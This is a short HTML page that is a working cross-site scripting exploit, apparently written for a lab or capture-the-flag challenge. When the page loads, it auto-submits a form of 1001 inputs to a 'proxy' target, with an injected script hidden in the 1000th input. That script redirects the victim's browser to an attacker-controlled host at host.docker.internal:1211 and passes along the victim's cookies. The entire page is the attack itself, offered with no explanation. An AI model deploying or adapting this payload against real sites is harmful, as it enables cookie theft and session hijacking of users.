```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form id="xss" action="http://proxy/" method="post">
        
    </form>
    <script>
        let xz = []
        for(let x = 0; x <= 1001; x++){
            inp = document.createElement('input')
            inp.name = "xss"
            if (x == 1000){
                inp.value = "\x3cscript>location=`http://host.docker.internal:1211/vv.html?${document.cookie}`\x3c/script>"
            }else {
                inp.value = "h"
            }
            xss.appendChild(inp)
        }
        xss.submit()

    </script>
</body>
</html>
```
